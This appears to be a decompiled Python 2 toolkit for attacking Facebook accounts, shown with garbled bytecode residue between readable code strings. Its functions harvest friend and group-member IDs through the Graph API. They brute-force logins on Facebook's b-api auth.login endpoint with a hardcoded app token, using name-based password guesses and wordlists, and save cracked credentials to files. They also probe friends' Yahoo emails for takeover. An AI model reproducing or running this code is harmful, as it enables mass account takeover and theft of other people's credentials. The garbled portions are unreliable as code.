s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | Rj   g-Cëâ6?sF   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get number [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R   R(   RF   Rn   RI   R   R   R+   R   R   R)   R    RY   RZ   R[   R\   R]   t   hpR   R   R   R   R   R   R   RH   R^   R*   R   Rx   R   R   Ra   R   R   (   Rb   Re   R/   R   R   t   nR   R   (    (    s   <Ahmad_Riswanto>R   5  sp    
	
0  
		






c          C   s/  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xyt  j d  t
 GHt d  } y> t j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d	 | d |   } t j | j  } t d  d d GHt d d  } xË | d D]¿ } t j d	 | d d
 |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wqht k
 r&qhXqhW| j   d d GHd GHd t t  GHt d  }
 t  j d d  |
  d! |
 GHt d  t   Wn t k
 r¶d" GHt d  t   nu t t f k
 râd# GHt d  t   nI t k
 rd$ GHt d  t   n# t j  j! k
 r*d% GHt"   n Xd  S(&   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rj   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s   /friends?access_token=s@   [1;91m[âº] [1;92mGet all friend number from friend [1;97m...i*   s
   [1;97mâs   out/no_teman_from_teman.txtR   Rf   Rc   R|   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sF   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get number [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R   R(   RF   Rn   RI   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   Rx   R    t   hpfromtemanR   R   R   R   R   R   R   R^   R   R   R   Ra   R   R   (   Rb   R   R   R   R/   Rg   R   R   R   R   R   (    (    s   <Ahmad_Riswanto>R   n  s    

	0  
		






c          C   s    t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   sN   [1;97mâ--[1;91m> [1;92m1.[1;97m Mini Hack Facebook([1;92mTarget[1;97m)s?   [1;97mâ--[1;91m> [1;92m2.[1;97m Multi Bruteforce FacebooksE   [1;97mâ--[1;91m> [1;92m3.[1;97m Super Multi Bruteforce FacebooksF   [1;97mâ--[1;91m> [1;92m4.[1;97m BruteForce([1;92mTarget[1;97m)s3   [1;97mâ--[1;91m> [1;92m5.[1;97m Yahoo Checkers*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t
   hack_pilih(   Rb   (    (    s   <Ahmad_Riswanto>t	   menu_hack¯  s$    c          C   sÂ   t  d  }  |  d k r' d GHt   n |  d k r= t   n |  d k rZ t   t   nd |  d k rp t   nN |  d k r t   n8 |  d k r t   n" |  d	 k r² t   n d GHt   d  S(
   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R&   Rp   Rq   Rr   R'   (	   R*   R©   t   minit   crackt   hasilt   supert   brutet
   menu_yahooRG   (   t   hack(    (    s   <Ahmad_Riswanto>R©   Ã  s&    






c          C   s	  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd d	 GHy[t	 d
  } t
 d  t j d | d |   } t j | j  } d | d GHt
 d  t j d  t
 d  t j d  d d	 GH| d d } t j d | d | d  } t j |  } d | k rd GHd | d GHd | GHd | GHt	 d  t   nPd | d k r×d GHd  GHd | d GHd | GHd | GHt	 d  t   n| d d! } t j d | d | d  } t j |  } d | k rWd GHd | d GHd | GHd | GHt	 d  t   nd | d k r¤d GHd  GHd | d GHd | GHd | GHt	 d  t   n6| d" d } t j d | d | d  } t j |  } d | k r$d GHd | d GHd | GHd | GHt	 d  t   n¶d | d k rqd GHd  GHd | d GHd | GHd | GHt	 d  t   ni| d# }	 |	 j d$ d%  }
 t j d | d |
 d  } t j |  } d | k rÿd GHd | d GHd | GHd |
 GHt	 d  t   nÛd | d k rLd GHd  GHd | d GHd | GHd |
 GHt	 d  t   n| d# } | j d$ d%  } | d | } t j d | d | d  } t j |  } d | k rèd GHd | d GHd | GHd | GHt	 d  t   nòd | d k r5d GHd  GHd | d GHd | GHd | GHt	 d  t   n¥d& } t j d | d | d  } t j |  } d | k r­d GHd | d GHd | GHd | GHt	 d  t   n-d | d k rúd GHd  GHd | d GHd | GHd | GHt	 d  t   nà d' } t j d | d | d  } t j |  } d | k rrd GHd | d GHd | GHd | GHt	 d  t   nh d | d k r¿d GHd  GHd | d GHd | GHd | GHt	 d  t   n d( GHd) GHt	 d  t   Wn' t k
 rd* GHt	 d  t   n Xd  S(+   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   se   [1;97m[[1;91mINFO[1;97m] [1;91mThe target account must be friends
       with your account first!i*   s
   [1;97mâs,   [1;91m[+] [1;92mTarget ID [1;91m:[1;97m s,   [1;91m[âº] [1;92mWait a minute [1;97m...s   https://graph.facebook.com/s   ?access_token=s"   [1;91m[â¹] [1;92mName[1;97m : Rj   s"   [1;91m[+] [1;92mCheck [1;97m...i   s*   [1;91m[+] [1;92mOpen password [1;97m...t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s   [1;91m[+] [1;92mFounds4   [1;91m[[1;96mâ[1;91m] [1;92mName[1;97m     : s&   [1;91m[â¹] [1;92mUsername[1;97m : s&   [1;91m[â¹] [1;92mPassword[1;97m : s   
[1;91m[ [1;97mBack [1;91m]s   www.facebook.comt	   error_msgs$   [1;91m[!] [1;93mAccount Checkpointt   12345t	   last_nameR~   t   /R
   t	   kontol123t	   sayang123s7   [1;91m[!] Sorry, failed to open the target password :(s   [1;91m[!] try it another way.s   [1;91m[!] Terget not found(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   R    RY   RZ   R[   R\   R]   t   urllibt   urlopent   loadRª   R   RH   (   Rb   Rc   R/   Rg   t   pz1Rf   Rk   t   pz2t   pz3t   lahirt   pz4t   lahirst   gazt   pz5t   pz6t   pz7(    (    s   <Ahmad_Riswanto>R«   Ú  s@   	


			

		

		

		

		

		


		

		


		

		

		

		

		

		



c          C   s6  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  a
 t	 d  a y~ t t
 d  a t d	  xC t d
  D]5 } t j d t d d  } | j   t j |  q³ Wx t D] } | j   qó WWn' t k
 r1d GHt	 d  t   n Xd  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97ms+   [1;91m[+] [1;92mPassword [1;91m: [1;97ms$   [1;91m[âº] [1;92mStart [1;97m...i(   t   targett   argss   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m](    (   R   R(   RF   Rn   RI   R   R   R+   R)   R*   t   idlistt   passwt   fileR    t   ranget	   threadingt   Threadt   scrakt   startt   threadsR   t   joinRª   (   Rb   R   Rh   (    (    s   <Ahmad_Riswanto>R¬     s2    


c    	      C   sg  y t  j d  Wn t k
 r$ n Xyýt t d  }  |  j   j   a xÕt r t j	   j
   } d | d t d } t j |  } t j |  } t t t  k r® Pn  d | k rEt d d  } | j | d	 t d
  | j   t j d | d | d  } t j | j  } t j d | d	 t d | d  nu d | d k r£t d d  } | j | d	 t d
  | j   t j d | d	 t  n t j |  t d 7a t j j d t t  d t t t   d t t t   d t t t    t j j   qL WWn> t  k
 rGd GHt! j" d  n t j# j$ k
 rbd GHn Xd  S(   NRu   R/   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s   out/mbf_ok.txtR   t   |s   
s   https://graph.facebook.com/s   ?access_token=s   [1;97m[ [1;92mOKâ[1;97m ] s    =>Rj   s   www.facebook.comR´   s   out/mbf_cp.txts   [1;97m[ [1;93mCPâ[1;97m ] i   s<   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack    [1;91m:[1;97m s    [1;96m>[1;97m s    =>[1;92mLive[1;91m:[1;96ms%    [1;97m=>[1;93mCheck[1;91m:[1;96ms   
[1;91m[!] Sleeps   [1;91m[â] No connection(%   R   R   R   RF   RÉ   Rn   t   splitt   upRË   t   readlinet   stripRÊ   Rº   R»   R[   R¼   t   backR   R   R^   RY   RZ   R\   R]   t   berhasilR   t   cekpointt   gagalR   R   R   R   RI   R   R   Ra   R   (	   t   bukat   usernameRe   Rf   t   mpsht   bisaR   R   t   cek(    (    s   <Ahmad_Riswanto>RÏ   ©  sF    	
(

V c          C   s_   Hd d GHx t  D] }  |  GHq Wx t D] } | GHq' Wd d GHd t t t   GHt   d  S(   Ni*   s
   [1;97mâs   [31m[x] Failed [1;97m--> (   RÙ   RÚ   R   R   RÛ   R   (   t   bt   c(    (    s   <Ahmad_Riswanto>R­   Ï  s    				c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s<   [1;97mâ--[1;91m> [1;92m1.[1;97m Crack with list friends7   [1;97mâ--[1;91m> [1;92m2.[1;97m Crack from friends=   [1;97mâ--[1;91m> [1;92m3.[1;97m Crack from member groups*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(   R   R(   RF   Rn   Rb   RI   R   R   R+   R)   t   pilih_super(    (    (    s   <Ahmad_Riswanto>R®   Þ  s     c          C   s  t  d  }  |  d k r' d GHt   n||  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } x,| d D] } t j | d	  q Wn|  d
 k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r.d GHt  d  t   n Xt d  t j d | d t  } t	 j
 | j  } x:| d D] } t j | d	  qqWn|  d k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 r d GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xH | d D] } t j | d	  qcWn" |  d k rt   n d GHt   d t t t   GHt d  d d  d! g } x0 | D]( } d" | Gt j j   t j d#  qØWHd$ d% GHd&   } t d'  } | j | t  d$ d% GHd( GHd) t t t   d* t t t   GHd+ GHt  d  t   d  S(,   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R$   s0   [1;91m[âº] [1;92mGet all friend id [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rf   Rc   R&   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rj   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s5   [1;91m[âº] [1;92mGet all id from friend [1;97m...s   /friends?access_token=Rp   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m s   [1;91m[!] Group not founds2   [1;91m[âº] [1;92mGet group member id [1;97m...s5   /members?fields=name,id&limit=999999999&access_token=R'   s+   [1;91m[+] [1;92mTotal ID [1;91m: [1;97ms$   [1;91m[âº] [1;92mStart [1;97m...s   .   s   ..  s   ... s0   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;97mi   i*   s
   [1;97mâc         S   s  |  } y t  j d  Wn t k
 r* n Xy\t j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k r[t d d  }	 |	 j | d | d  |	 j   t j | |  n+| d d }
 t	 j
 d | d |
 d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d |
 d | d GHt j | |
  nd | d k r[t d d  }	 |	 j | d |
 d  |	 j   t j | |
  n+| d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k r[t d d  }	 |	 j | d | d  |	 j   t j | |  n+| d } | j d d  } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nsd | d k rit d d  }	 |	 j | d | d  |	 j   t j | |  nd } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  n{d | d k rat d d  }	 |	 j | d | d  |	 j   t j | |  n%d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k rYt d d  }	 |	 j | d | d  |	 j   t j | |  n-t j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k r0t j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nV d | d k rt d d  }	 |	 j | d | d  |	 j   t j | |  n  Wn n Xd  S(   NRu   s   https://graph.facebook.com/s   /?access_token=R²   R³   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s   ?access_token=s   [1;97m[ [1;92mOKâ[1;97m ] RÓ   s    =>Rj   s   www.facebook.comR´   s   out/super_cp.txtRg   s   
Rµ   R¶   R~   R·   R
   R¹   R¸   t   321(   R   R   R   RY   RZ   Rb   R[   R\   R]   Rº   R»   R¼   t   oksR   RF   R   R^   RÚ   R   (   t   argt   userRg   Rá   t   pass1Rf   R   R   R   Rà   t   pass2t   pass3RÀ   t   pass4t   pass5t   pass6t   pass7(    (    s   <Ahmad_Riswanto>t   main0  sÐ    







i   s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s.   [1;91m[+] [1;92mTotal OK/CP [1;91m: [1;92ms   [1;97m/[1;93ms@   [1;91m[+] [1;92mCP File saved [1;91m: [1;97mout/super_cp.txt(   R*   Rã   R   R(   R)   R    RY   RZ   Rb   R[   R\   R]   Rc   R   RH   R®   Rª   R   R   R   R   R   R   R   R    t   mapRå   RÚ   (   t   peakR/   R   R¡   R   R   R   R   t   idgR   R    t   pR!   R"   Rï   (    (    s   <Ahmad_Riswanto>Rã   ñ  s    







  			)
c    	      C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHyùt
 d  }  t
 d  } t | d  } | j   } d	 d
 GHd |  GHd t t |   d GHt d  t | d  } x{| D]s} yA| j d d  } t j j d |  t j j   t j d |  d | d  } t j | j  } d | k rÈt d d  } | j |  d | d  | j   d GHd	 d
 GHd |  GHd | GHt   nq d | d k r9t d d  } | j |  d | d  | j   d GHd	 d
 GHd GHd |  GHd | GHt   n  Wqó t j j k
 red  GHt j d  qó Xqó WWn t k
 rd! GHt   n Xd  S("   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   sX   [1;91m[+] [1;92mID[1;97m/[1;92mEmail[1;97m/[1;92mHp [1;97mTarget [1;91m:[1;97m s@   [1;91m[+] [1;92mWordlist [1;97mext(list.txt) [1;91m: [1;97mi*   s
   [1;97mâs9   [1;91m[[1;96mâ[1;91m] [1;92mTarget [1;91m:[1;97m s   [1;91m[+] [1;92mTotal[1;96m s    [1;92mPasswords$   [1;91m[âº] [1;92mStart [1;97m...s   
R
   s9   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;91m: [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s	   Brute.txtR   s    | s   
[1;91m[+] [1;92mFounds-   [1;91m[â¹] [1;92mUsername [1;91m:[1;97m s-   [1;91m[â¹] [1;92mPassword [1;91m:[1;97m s   www.facebook.comR´   s   Brutecekpoint.txts$   [1;91m[!] [1;93mAccount Checkpoints   [1;91m[!] Connection Errors   [1;91m[!] File not found(   R   R(   RF   Rn   Rb   RI   R   R   R+   R)   R*   t	   readlinesR   R   R    R   R   R   R   R   RY   RZ   R[   R\   R]   R^   R   Ra   R   t   tanyaw(	   R1   RÊ   t   totalt   sandit   pwRf   RÞ   t   dapatt   ceks(    (    s   <Ahmad_Riswanto>R¯   ¼  sh    		

			

			c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(   Ns@   [1;91m[?] [1;92mCreate wordlist ? [1;92m[y/n][1;91m:[1;97m R
   s   [1;91m[!] WrongRk   t   YR§   t   N(   R*   Rõ   t   wordlistRª   (   t   why(    (    s   <Ahmad_Riswanto>Rõ   ò  s    




c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;97mâ--[1;91m> [1;92m1.[1;97m With list friends7   [1;97mâ--[1;91m> [1;92m2.[1;97m Clone from friends=   [1;97mâ--[1;91m> [1;92m3.[1;97m Clone from member groups0   [1;97mâ--[1;91m> [1;92m4.[1;97m Using files*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(   R   R(   RF   Rn   Rb   RI   R   R   R+   R)   t   yahoo_pilih(    (    (    s   <Ahmad_Riswanto>R°     s"    c          C   s¥   t  d  }  |  d k r' d GHt   nz |  d k r= t   nd |  d k rS t   nN |  d k ri t   n8 |  d k r t   n" |  d k r t   n d GHt   d  S(	   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] WrongR%   R&   Rp   Rq   R'   (   R*   Rÿ   t   yahoofriendst   yahoofromfriendst   yahoomembert	   yahoolistRª   (   t   go(    (    s   <Ahmad_Riswanto>Rÿ     s     





c          C   sµ  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  t j d
 t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d } | d } t j d | d t  } t j | j  }	 yù |	 d }
 t j d  } | j |
  j   } d | k rUt j d  t t j _ t j d d  |
 t d <t j   j   } t j d  } y | j |  j   } Wn
 wÿ n Xd | k rU| j |
 d  d |
 d | GHt j |
  qUn  Wqÿ t k
 riqÿ Xqÿ Wd d GHd  GHd! t  t! t   GHd" GH| j"   t# d#  t$   d  S($   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   i    s3   [1;91m[âº] [1;92mGetting email friend [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRf   Rc   Rj   s   https://graph.facebook.com/s   ?access_token=R1   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR0   RÝ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97ms=   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/MailVuln.txts   
[1;91m[ [1;97mBack [1;91m](%   R   R(   RF   Rn   Rb   RI   R   R   R+   R   R   R)   R    RY   RZ   R[   R\   R]   R   R    t   compilet   searcht   groupRK   RN   RO   RP   RQ   RS   R   RÙ   RH   R   R   R^   R*   R°   (   RÞ   t   jmlt   temant   kimakt   saveR   Rc   Rm   t   linksR   t   mailt   yahooRl   t   klikR   t   pek(    (    s   <Ahmad_Riswanto>R   -  sr    

	




	

c          C   s1  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d
 | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d }	 | d }
 t j d
 |	 d t  } t j | j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d d  | t d <t j   j   } t j d  } y | j |  j   } Wn
 w{n Xd  | k rÑ| j  | d!  d" | d# |
 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd d GHd$ GHd% t" t# t!   GHd& GH| j$   t d  t   d  S('   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   i    s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rj   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s8   [1;91m[âº] [1;92mGetting email from friend [1;97m...s   /friends?access_token=s   out/FriendMailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRf   Rc   R1   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR0   RÝ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msC   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FriendMailVuln.txt(%   R   R(   RF   Rn   Rb   RI   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   R°   R    R   R    R  R  R  RK   RN   RO   RP   RQ   RS   R   RÙ   R   R   R^   (   RÞ   R  R   R   R   R	  R
  R  R   Rc   Rm   R  R   R  R  Rl   R  R  (    (    s   <Ahmad_Riswanto>R  j  s    


	




	

c          C   s1  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d } | d }	 t j d | d t  }
 t j |
 j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d d  | t d  <t j   j   } t j d!  } y | j |  j   } Wn
 w{n Xd" | k rÑ| j  | d#  d$ | d% |	 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd d GHd& GHd' t" t# t!   GHd( GH| j$   t d  t   d  S()   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   i    s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s7   [1;91m[âº] [1;92mGetting email from group [1;97m...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s   out/GrupMailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRf   Rc   s   ?access_token=R1   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR0   RÝ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msA   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/GrupMailVuln.txt(%   R   R(   RF   Rn   Rb   RI   R   R   R+   R   R   R)   R*   RY   RZ   R[   R\   R]   RH   R°   R    R   R    R  R  R  RK   RN   RO   RP   RQ   RS   R   RÙ   R   R   R^   (   RÞ   R  Rc   R/   R   R	  R
  R  R   Rm   R  R   R  R  Rl   R  R   R  (    (    s   <Ahmad_Riswanto>R  °  s    


	




	

c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHt d  }  y t |  d  } | j   } Wn' t k
 rë d	 GHt d
  t   n Xg  } d } t d  t d d  } d d GHt |  d  j   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   } d | k r6t j d  t t j _ t j d d  | t d <t j   j   }	 t j d  }
 y |
 j |	  j   } Wn
 q6n Xd | k rH| j | d  d | GHt j |  qHq6q6Wd d GHd GHd t t t   GHd GH| j    t d
  t   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s,   [1;91m[+] [1;92mFile path [1;91m: [1;97ms   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]i    s$   [1;91m[âº] [1;92mStart [1;97m...s   out/FileMailVuln.txtR   i*   s
   [1;97mâs   
R
   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR0   RÝ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msA   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FileMailVuln.txt(!   R   R(   RF   Rn   Rb   RI   R   R   R+   R   R   R)   R*   Rô   R°   R    R   R   R    R  R  R  RK   RN   RO   RP   RQ   RS   R   RÙ   R   R   R^   (   t   filesRö   R  RÞ   R  R  Rø   R  Rl   R  R   R  (    (    s   <Ahmad_Riswanto>R  ö  sp    

	

		

c          C   sª   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s?   [1;97mâ--[1;91m> [1;92m1.[1;97m Bot Reactions Target Posts=   [1;97mâ--[1;91m> [1;92m2.[1;97m Bot Reactions Grup Posts;   [1;97mâ--[1;91m> [1;92m3.[1;97m Bot Komen Target Posts9   [1;97mâ--[1;91m> [1;92m4.[1;97m Bot Komen Grup Posts6   [1;97mâ--[1;91m> [1;92m5.[1;97m Mass delete Posts8   [1;97mâ--[1;91m> [1;92m6.[1;97m Mass accept friends8   [1;97mâ--[1;91m> [1;92m7.[1;97m Mass delete friends*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t	   bot_pilih(   Rb   (    (    s   <Ahmad_Riswanto>Ry   5  s(    c          C   sç   t  d  }  |  d k r' d GHt   n¼ |  d k r= t   n¦ |  d k rS t   n |  d k ri t   nz |  d k r t   nd |  d k r t   nN |  d	 k r« t   n8 |  d
 k rÁ t   n" |  d k r× t	   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R&   Rp   Rq   Rr   Rs   Rt   R'   (
   R*   R  t
   menu_reactt
   grup_reactt	   bot_koment
   grup_koment
   deletepostt   acceptt   unfriendRG   (   t   bots(    (    s   <Ahmad_Riswanto>R  K  s,    








c          C   s¥   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
